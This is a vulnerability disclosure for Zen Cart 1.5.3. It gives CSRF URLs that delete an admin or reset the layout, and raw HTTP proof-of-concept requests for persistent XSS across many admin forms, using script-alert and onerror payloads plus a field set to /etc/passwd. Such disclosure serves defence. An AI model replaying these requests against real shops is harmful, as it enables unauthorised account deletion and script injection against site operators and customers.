@@ -1,0 +1,712 @@
+#Title: Zen Cart 1.5.3 - CSRF & Admin Panel XSS
+#Date: 09.07.14
+#Vendor: zen-cart.com
+#Tested on: Apache 2.2 [at] Linux
+#Contact: smash[at]devilteam.pl
+ 
+#1 - CSRF
+ 
+- Delete admin
+ 
+GET profile stands for user id.
+ 
+localhost/zen/zen-cart-v1.5.3-07042014/admin123/profiles.php?action=delete&profile=2
+ 
+- Reset layout boxes to default
+ 
+localhost/zen/zen-cart-v1.5.3-07042014/admin123/layout_controller.php?page=&cID=74&action=reset_defaults
+ 
+ 
+#2 - Persistent XSS in admin panel
+ 
+Since admin privileges are required to execute following vulnerablities this is not a serious threat.
+ 
+- Extras -> Media types -> Add
+ 
+Vulnerable parameters - type_name & type_exit
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/media_types.php?page=1&mID=2&action=save HTTP/1.1
+Host: localhost
+Content-Type: multipart/form-data; boundary=---------------------------4978676881674017321390852339
+Content-Length: 663
+ 
+-----------------------------4978676881674017321390852339
+Content-Disposition: form-data; name="securityToken"
+ 
+b98019227f8014aed6d22b02f0748d11
+-----------------------------4978676881674017321390852339
+Content-Disposition: form-data; name="type_name"
+ 
+<h1>sup<!--
+-----------------------------4978676881674017321390852339
+Content-Disposition: form-data; name="type_ext"
+ 
+sup<>
+-----------------------------4978676881674017321390852339
+Content-Disposition: form-data; name="x"
+ 
+19
+-----------------------------4978676881674017321390852339
+Content-Disposition: form-data; name="y"
+ 
+13
+-----------------------------4978676881674017321390852339--
+ 
+Response:
+(...)
+<td class="dataTableContent"><h1>sup<!--</td>
+<td class="dataTableContent">sup<></td>
+<td class="dataTableContent" align="right">
+(...)
+ 
+- Extras -> Media manager -> Add
+ 
+Vulnerable parameter - media_name
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/media_manager.php?page=1&mID=1&action=save HTTP/1.1
+Host: localhost
+Content-Type: multipart/form-data; boundary=---------------------------1835318161847256146721022401
+Content-Length: 5633
+ 
+-----------------------------1835318161847256146721022401
+Content-Disposition: form-data; name="securityToken"
+ 
+b98019227f8014aed6d22b02f0748d11
+-----------------------------1835318161847256146721022401
+Content-Disposition: form-data; name="media_name"
+ 
+<script>alert(666)</script>
+-----------------------------1835318161847256146721022401
+Content-Disposition: form-data; name="x"
+ 
+32
+-----------------------------1835318161847256146721022401
+Content-Disposition: form-data; name="y"
+ 
+16
+-----------------------------1835318161847256146721022401
+Content-Disposition: form-data; name="clip_filename"; filename="cat.png"
+Content-Type: image/png
+ 
+(image)
+ 
+-----------------------------1835318161847256146721022401
+Content-Disposition: form-data; name="media_dir"
+ 
+ 
+-----------------------------1835318161847256146721022401
+Content-Disposition: form-data; name="media_type"
+ 
+2
+-----------------------------1835318161847256146721022401--
+ 
+Response:
+(...)
+<td class="dataTableContent"><script>alert(666)</script></td>
+<td class="dataTableContent" align="right">
+(...)
+<tr class="infoBoxHeading">
+  <td class="infoBoxHeading"><strong><script>alert(666)</script></strong></td>
+</tr>
+ 
+- Extras -> Music genre -> Add
+ 
+Vulenrable parameter - music_genre_name
+ 
+POST /zen/zen-cart-v1.5.3-07042014/admin123/music_genre.php?action=insert HTTP/1.1
+Host: localhost
+Content-Type: multipart/form-data; boundary=---------------------------202746648818048680751007920584
+Content-Length: 581
+ 
+-----------------------------202746648818048680751007920584
+Content-Disposition: form-data; name="securityToken"
+ 
+b98019227f8014aed6d22b02f0748d11
+-----------------------------202746648818048680751007920584
+Content-Disposition: form-data; name="music_genre_name"
+ 
+<script>alert(666)</script>
+-----------------------------202746648818048680751007920584
+Content-Disposition: form-data; name="x"
+ 
+37
+-----------------------------202746648818048680751007920584
+Content-Disposition: form-data; name="y"
+ 
+10
+-----------------------------202746648818048680751007920584--
+ 
+Response:
+(...)
+<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href='http://localhost/zen/zen-cart-v1.5.3-07042014/admin123/music_genre.php?page=1&mID=1&action=edit'">
+<td class="dataTableContent"><script>alert(666)</script></td>
+<td class="dataTableContent" align="right">
+(...)
+<tr class="infoBoxHeading">
+<td class="infoBoxHeading"><b><script>alert(666)</script></b></td>
+</tr>
+(...)
+ 
+Further vuln:
+http://localhost/zen/zen-cart-v1.5.3-07042014/index.php?main_page=index&typefilter=music_genre&music_genre_id=1
+ 
+Response:
+(...)
+<div id="navBreadCrumb">  <a href="http://localhost/zen/zen-cart-v1.5.3-07042014/">Home</a>&nbps;::&nbps;
+<script>alert(666)</script>
+</div>
+(...)
+ 
+- Extras -> Record companies -> Add
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/record_company.php?action=insert HTTP/1.1
+Host: localhost
+Content-Type: multipart/form-data; boundary=---------------------------19884630671863875697751588711
+Content-Length: 5828
+ 
+-----------------------------19884630671863875697751588711
+Content-Disposition: form-data; name="securityToken"
+ 
+b98019227f8014aed6d22b02f0748d11
+-----------------------------19884630671863875697751588711
+Content-Disposition: form-data; name="record_company_name"
+ 
+<script>alert(666)</script>
+-----------------------------19884630671863875697751588711
+Content-Disposition: form-data; name="record_company_image"; filename="<img src=# onerror=alert(1)>.png"
+Content-Type: image/png
+ 
+-----------------------------19884630671863875697751588711
+Content-Disposition: form-data; name="img_dir"
+ 
+categories/
+-----------------------------19884630671863875697751588711
+Content-Disposition: form-data; name="record_company_image_manual"
+ 
+/etc/passwd
+-----------------------------19884630671863875697751588711
+Content-Disposition: form-data; name="record_company_url[1]"
+ 
+'>"><>XSS
+-----------------------------19884630671863875697751588711
+Content-Disposition: form-data; name="x"
+ 
+21
+-----------------------------19884630671863875697751588711
+Content-Disposition: form-data; name="y"
+ 
+13
+-----------------------------19884630671863875697751588711--
+ 
+Response:
+(...)
+<td class="dataTableContent"><script>alert(666)</script></td>
+<td class="dataTableContent" align="right">
+(...)
+<tr class="infoBoxHeading">
+<td class="infoBoxHeading"><b><script>alert(666)</script></b></td>
+</tr>
+(...)
+ 
+Further vuln:
+http://localhost/zen/zen-cart-v1.5.3-07042014/index.php?main_page=index&typefilter=music_genre&music_genre_id=1
+ 
+Response:
+(...)
+<div id="navBreadCrumb">  <a href="http://localhost/zen/zen-cart-v1.5.3-07042014/">Home</a>&nbps;::&nbps;
+<script>alert(666)</script>
+</div>
+<div class="centerColumn" id="indexProductList">
+<h1 id="productListHeading"><script>alert(666)</script></h1>
+(...)
+ 
+- Extras -> Recording Artists -> Add
+ 
+Vulnerable parameter - artists_name
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/record_artists.php?action=insert HTTP/1.1
+Host: localhost
+Content-Type: multipart/form-data; boundary=---------------------------14015448418946681711346093460
+Content-Length: 1099
+ 
+-----------------------------14015448418946681711346093460
+Content-Disposition: form-data; name="securityToken"
+ 
+84c8fe52eb9b3b0e026b5438e1c21f6f
+-----------------------------14015448418946681711346093460
+Content-Disposition: form-data; name="artists_name"
+ 
+<script>alert(666)</script>
+-----------------------------14015448418946681711346093460
+(Content-Disposition: form-data; name="artists_image"; filename=""
+Content-Type: application/octet-stream
+ 
+ 
+-----------------------------14015448418946681711346093460
+Content-Disposition: form-data; name="img_dir"
+ 
+ 
+-----------------------------14015448418946681711346093460
+Content-Disposition: form-data; name="artists_image_manual"
+ 
+ 
+-----------------------------14015448418946681711346093460
+Content-Disposition: form-data; name="artists_url[1]"
+ 
+ 
+-----------------------------14015448418946681711346093460
+Content-Disposition: form-data; name="x"
+ 
+39
+-----------------------------14015448418946681711346093460
+Content-Disposition: form-data; name="y"
+ 
+19
+-----------------------------14015448418946681711346093460--)
+ 
+Response:
+(...)
+<td class="dataTableContent"><script>alert(666)</script></td>
+<td class="dataTableContent" align="right">
+(...)
+  <tr class="infoBoxHeading">
+    <td class="infoBoxHeading"><b><script>alert(666)</script></b></td>
+  </tr>
+(...)
+ 
+- Gift Certificate/Coupons ->  Coupon admin -> Add
+ 
+Vulnerable parameters - coupon_name, coupon_desc, coupon_amount, coupon_min_order, coupon_code, coupon_uses_coupon, coupon_uses_user
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/coupon_admin.php?action=update&oldaction=new&cid=0&page=0 HTTP/1.1
+Host: localhost
+ 
+securityToken=84c8fe52eb9b3b0e026b5438e1c21f6f&coupon_name%5B1%5D=%27%3E%22%3E%3C%3EXSSD&coupon_desc%5B1%5D=%27%3E%22%3E%3C%3EXSSD&coupon_amount=%27%3E%22%3E%3C%3EXSSD&coupon_min_order=%27%3E%22%3E%3C%3EXSSD&coupon_free_ship=on&coupon_code=%27%3E%22%3E%3C%3EXSSD&coupon_uses_coupon=%27%3E%22%3E%3C%3EXSSD&coupon_uses_user=%27%3E%22%3E%3C%3EXSSD&coupon_startdate_day=9&coupon_startdate_month=7&coupon_startdate_year=2014&coupon_finishdate_day=9&coupon_finishdate_month=7&coupon_finishdate_year=2015&coupon_zone_restriction=1&x=62&y=10
+ 
+Response:
+(...)
+ 
+      <tr>
+        <td align="left">Coupon Name</td>
+        <td align="left">'>"><>XSSD</td>
+      </tr>
+      <tr>
+        <td align="left">Coupon Description <br />(Customer can see)</td>
+        <td align="left">'>"><>XSSD</td>
+      </tr>
+      <tr>
+        <td align="left">Coupon Amount</td>
+        <td align="left"></td>
+      </tr>
+ 
+      <tr>
+        <td align="left">Coupon Minimum Order</td>
+        <td align="left">'>"><>XSSD</td>
+      </tr>
+ 
+      <tr>
+        <td align="left">Free Shipping</td>
+        <td align="left">Free Shipping</td>
+      </tr>
+      <tr>
+        <td align="left">Coupon Code</td>
+        <td align="left">'>"><>XSSD</td>
+      </tr>
+ 
+      <tr>
+        <td align="left">Uses per Coupon</td>
+        <td align="left">'>"><>XSSD</td>
+      </tr>
+ 
+      <tr>
+        <td align="left">Uses per Customer</td>
+        <td align="left">'>"><>XSSD</td>
+      </tr>
+(...)
+ 
+- Gift Certificate/Coupons -> Mail gift certificate -> Send
+ 
+Vulnerable parameter - email_to
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/gv_mail.php?action=preview HTTP/1.1
+Host: localhost
+ 
+securityToken=84c8fe52eb9b3b0e026b5438e1c21f6f&customers_email_address=Active+customers+in+past+3+months+%28Subscribers%29&email_to=%27%3E%22%3E%3C%3EXSSED&from=szit%40szit.in&subject=asdf&amount=666&message=asdf&x=13&y=12
+ 
+Response:
+(...)
+</tr>
+<tr>
+<td class="smallText"><b>Customer:</b><br />'>"><>XSSED</td>
+</tr>
+<tr>
+(...)
+ 
+- Tools -> Banner manager -> Add
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/banner_manager.php?page=1&action=add HTTP/1.1
+Host: localhost
+Content-Type: multipart/form-data; boundary=---------------------------3847719184268426731396009422
+Content-Length: 2317
+ 
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="securityToken"
+ 
+84c8fe52eb9b3b0e026b5438e1c21f6f
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="status"
+ 
+1
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="banners_open_new_windows"
+ 
+0
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="banners_on_ssl"
+ 
+1
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="banners_title"
+ 
+'>"><>XSS
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="banners_url"
+ 
+'>"><>XSS
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="banners_group"
+ 
+BannersAll
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="new_banners_group"
+ 
+'>"><>XSS
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="banners_image"; filename=""
+Content-Type: application/octet-stream
+ 
+ 
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="banners_image_local"
+ 
+ 
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="banners_image_target"
+ 
+ 
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="banners_html_text"
+ 
+'>"><>XSS
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="banners_sort_order"
+ 
+15
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="date_scheduled"
+ 
+ 
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="expires_date"
+ 
+ 
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="expires_impressions"
+ 
+0
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="x"
+ 
+9
+-----------------------------3847719184268426731396009422
+Content-Disposition: form-data; name="y"
+ 
+7
+-----------------------------3847719184268426731396009422--
+ 
+ 
+Response:
+(...)
+<td class="dataTableContent"><a href="javascript:popupImageWindow('popup_image.php?banner=10')"><img src="images/icon_popup.gif" border="0" alt="View Banner" title=" View Banner "></a>&nbps;'>"><>XSS</td>
+<td class="dataTableContent" align="right">'>"><>XSS</td>
+<td class="dataTableContent" align="right">0 / 0</td>
+(...)
+  <tr class="infoBoxHeading">
+    <td class="infoBoxHeading"><b>'>"><>XSS</b></td>
+  </tr>
+(...)
+ 
+- Tools -> Newsletter and Product Notifications Manager -> New newsletter
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/newsletters.php?action=insert HTTP/1.1
+Host: localhost
+ 
+securityToken=93867dff1d912bde757ce2bc0ac94425&module=newsletter&title=%27%3E%22%3E%3C%3EXSS&message_html=%27%3E%22%3E%3C%3EXSS&content=%27%3E%22%3E%3C%3EXSS&x=32&y=8
+ 
+Response:
+(...)
+<td class="dataTableContent"><a href="http://localhost/zen/zen-cart-v1.5.3-07042014/admin123/newsletters.php?page=1&nID=1&action=preview"><img src="images/icons/preview.gif" border="0" alt="Preview" title=" Preview "></a>&nbps;'>"><>XSS</td>
+<td class="dataTableContent" align="right">18 bytes</td>
+(...)
+<table border="0" width="100%" cellspacing="0" cellpadding="2">
+  <tr class="infoBoxHeading">
+    <td class="infoBoxHeading"><b>'>"><>XSS</b></td>
+  </tr>
+(...)
+ 
+- Tools -> EZ-Pages -> New file
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/ezpages.php?action=insert HTTP/1.1
+Host: localhost
+Content-Type: multipart/form-data; boundary=---------------------------134785397313015614741294511591
+Content-Length: 2253
+ 
+-----------------------------134785397313015614741294511591
+Content-Disposition: form-data; name="securityToken"
+ 
+c74a83cefbb5ffc1868dd4a390bd0880
+-----------------------------134785397313015614741294511591
+Content-Disposition: form-data; name="x"
+ 
+41
+-----------------------------134785397313015614741294511591
+Content-Disposition: form-data; name="y"
+ 
+17
+-----------------------------134785397313015614741294511591
+Content-Disposition: form-data; name="pages_title"
+ 
+'>"><>XSS
+-----------------------------134785397313015614741294511591
+Content-Disposition: form-data; name="page_open_new_window"
+ 
+0
+-----------------------------134785397313015614741294511591
+ 
+(...)
+ 
+-----------------------------134785397313015614741294511591
+Content-Disposition: form-data; name="pages_html_text"
+ 
+'>"><>XSS
+-----------------------------134785397313015614741294511591
+Content-Disposition: form-data; name="alt_url"
+ 
+ 
+-----------------------------134785397313015614741294511591
+Content-Disposition: form-data; name="alt_url_external"
+ 
+ 
+-----------------------------134785397313015614741294511591--
+ 
+Response:
+(...)
+<td class="dataTableContent" width="75px" align="right">&nbps;1</td>
+<td class="dataTableContent">&nbps;'>"><>XSS</td>
+(...)
+  <tr class="infoBoxHeading">
+    <td class="infoBoxHeading"><b>Title:&nbps;'>"><>XSS&nbps;|&nbps;Prev/Next Chapter:&nbps;0</b></td>
+  </tr>
+(...)
+ 
+- Localization -> Currencies -> New currency
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/currencies.php?page=1&action=insert HTTP/1.1
+Host: localhost
+ 
+securityToken=c74a83cefbb5ffc1868dd4a390bd0880&title=%27%3E%22%3E%3C%3EXSS&code=%27%3E%22%3E%3C%3EXSS&symbol_left=%27%3E%22%3E%3C%3EXSS&symbol_right=%27%3E%22%3E%3C%3EXSS&decimal_point=%27%3E%22%3E%3C%3EXSS&thousands_point=%27%3E%22%3E%3C%3EXSS&decimal_places=%27%3E%22%3E%3C%3EXSS&value=%27%3E%22%3E%3C%3EXSS&x=13&y=15
+ 
+Response:
+(...)
+<td class="dataTableContent">'>"><>XSS</td>
+<td class="dataTableContent">'>"</td>
+(...)
+  <tr class="infoBoxHeading">
+    <td class="infoBoxHeading"><b>'>"><>XSS</b></td>
+  </tr>
+(...)
+  <tr>
+    <td class="infoBoxContent"><br>Title: '>"><>XSS</td>
+  </tr>
+  <tr>
+    <td class="infoBoxContent">Code: '>"</td>
+  </tr>
+  <tr>
+    <td class="infoBoxContent"><br>Symbol Left: '>"><>XSS</td>
+  </tr>
+  <tr>
+    <td class="infoBoxContent">Symbol Right: '>"><>XSS</td>
+  </tr>
+(...)
+  <tr>
+    <td class="infoBoxContent"><br>Example Output:<br>$30.00 = '>"><>XSS0'>"><>XSS</td>
+  </tr>
+</table>
+(...)
+  <tr>
+    <td class="infoBoxContent"><br>Example Output:<br>$30.00 = '>"><>XSS0'>"><>XSS</td>
+  </tr>
+ 
+- Localization -> Languages -> New language
+ 
+Affects big part of admin panel.
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/languages.php?action=insert HTTP/1.1
+Host: localhost
+ 
+securityToken=c74a83cefbb5ffc1868dd4a390bd0880&name=%27%3E%22%3E%3C%3EXSS&code=xs&image=icon.gif&directory=%27%3E%22%3E%3C%3EXSS&sort_order=%27%3E%22%3E%3C%3EXSS&x=40&y=20
+   
+Response:
+(...)
+    <td class="messageStackCaution"><img src="images/icons/warning.gif" border="0" alt="Warning" title=" Warning ">&nbps;MISSING LANGUAGE FILES OR DIRECTORIES ... '>"><>XSS '>"><>XSS</td>
+  </tr>
+</table>
+(...)
+                <td class="dataTableContent">'>"><>XSS</td>
+                <td class="dataTableContent">xs</td>
+(...)
+    <td class="infoBoxHeading"><b>'>"><>XSS</b></td>
+  </tr>
+(...)
+  <tr>
+    <td class="infoBoxContent"><br>Name: '>"><>XSS</td>
+  </tr>
+  <tr>
+    <td class="infoBoxContent">Code: xs</td>
+  </tr>
+  <tr>
+    <td class="infoBoxContent"><br><img src="http://localhost/zen/zen-cart-v1.5.3-07042014/includes/languages/'>"><>XSS/images/icon.gif" border="0" alt="'>"><>XSS" title=" '>"><>XSS "></td>
+  </tr>
+  <tr>
+    <td class="infoBoxContent"><br>Directory:<br>http://localhost/zen/zen-cart-v1.5.3-07042014/includes/languages/<b>'>"><>XSS</b></td>
+  </tr>
+(...)
+ 
+Further injection:
+http://localhost/zen/zen-cart-v1.5.3-07042014/admin123/orders_status.php
+ 
+- Localization -> Orders status -> Insert
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/orders_status.php?page=1&action=insert HTTP/1.1
+Host: localhost
+ 
+securityToken=c74a83cefbb5ffc1868dd4a390bd0880&orders_status_name%5B2%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B1%5D=%27%3E%22%3E%3C%3EXSS&x=9&y=7
+ 
+Response:
+(...)
+<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href='http://localhost/zen/zen-cart-v1.5.3-07042014/admin123/orders_status.php?page=1&oID=5&action=edit'">
+<td class="dataTableContent">'>"><>XSS</td>
+<td class="dataTableContent" align="right"><img src="images/icon_arrow_right.gif" border="0" alt="">&nbps;</td>
+(...)
+ 
+- Locations / Taxes -> Zones -> New zone
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/zones.php?page=1&action=insert HTTP/1.1
+Host: localhost
+ 
+securityToken=c74a83cefbb5ffc1868dd4a390bd0880&zone_name=%27%3E%22%3E%3C%3EXSS&zone_code=%27%3E%22%3E%3C%3EXSS&zone_country_id=247&x=17&y=11
+ 
+Response:
+(...)
+<td class="dataTableContent">'>"><>XSS</td>
+<td class="dataTableContent">'>"><>XSS</td>
+<td class="dataTableContent" align="center">'>"><>XSS</td>
+(...)
+    <td class="infoBoxHeading"><b>'>"><>XSS</b></td>
+  </tr>
+</table>
+(...)
+  <tr>
+    <td class="infoBoxContent"><br>Zones Name:<br>'>"><>XSS ('>"><>XSS)</td>
+  </tr>
+  <tr>
+    <td class="infoBoxContent"><br>Country: '>"><>XSS</td>
+ 
+- - Locations / Taxes -> Zone definitions -> Insert
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/geo_zones.php?zpage=1&zID=1&action=insert_zone HTTP/1.1
+Host: localhost
+ 
+securityToken=c74a83cefbb5ffc1868dd4a390bd0880&geo_zone_name=%27%3E%22%3E%3C%3EXSS&geo_zone_description=%27%3E%22%3E%3C%3EXSS&x=25&y=13
+ 
+Response:
+(...)
+</a>&nbps;'>"><>XSS</td>
+<td class="dataTableContent">'>"><>XSS</td>
+(...)
+<td class="infoBoxHeading"><b>'>"><>XSS</b></td>
+(...)
+<td class="infoBoxContent"><br>Description:<br>'>"><>XSS</td>
+ 
+- Locations / Taxes -> Tax Classes -> New tax class
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/tax_classes.php?page=1&action=insert HTTP/1.1
+Host: localhost
+ 
+securityToken=c74a83cefbb5ffc1868dd4a390bd0880&tax_class_title=%27%3E%22%3E%3C%3EXSS&tax_class_description=%27%3E%22%3E%3C%3EXSS&x=33&y=9
+ 
+Response:
+(...)
+<td class="dataTableContent">'>"><>XSS</td>
+(...)
+<td class="infoBoxHeading"><b>'>"><>XSS</b></td>
+(...)
+<td class="infoBoxContent"><br>Description:<br>'>"><>XSS</td>
+(...)
+ 
+- - Locations / Taxes -> Tax Rates -> New tax rate
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/tax_rates.php?page=1&action=insert HTTP/1.1
+Host: localhost
+ 
+securityToken=c74a83cefbb5ffc1868dd4a390bd0880&tax_class_id=2&tax_zone_id=2&tax_rate=66&tax_description=%27%3E%22%3E%3C%3EXSS&tax_priority=&x=32&y=16
+ 
+Response:
+(...)
+<td class="dataTableContent">'>"><>XSS</td>
+<td class="dataTableContent">'>"><>XSS</td>
+<td class="dataTableContent">66%</td>
+<td class="dataTableContent">'>"><>XSS</td>
+(...)
+  <tr class="infoBoxHeading">
+    <td class="infoBoxHeading"><b>'>"><>XSS</b></td>
+  </tr>
+(...)
+    <td class="infoBoxContent"><br>Description:<br>'>"><>XSS</td>
+(...)
+ 
+ 
+- Customers -> Group Pricing -> Insert
+ 
+Request:
+POST /zen/zen-cart-v1.5.3-07042014/admin123/group_pricing.php?action=insert HTTP/1.1
+Host: localhost
+ 
+securityToken=c74a83cefbb5ffc1868dd4a390bd0880&group_name=%27%3E%22%3E%3C%3EXSS&group_percentage=%27%3E%22%3E%3C%3EXSS&x=10&y=9
+ 
+Response:
+(...)
+<td class="dataTableContent">1</td>
+<td class="dataTableContent">'>"><>XSS</td>
+<td class="dataTableContent">0.00</td>
+(...)
+  <tr class="infoBoxHeading">
+    <td class="infoBoxHeading"><b>'>"><>XSS</b></td>
+  </tr>
+(...)
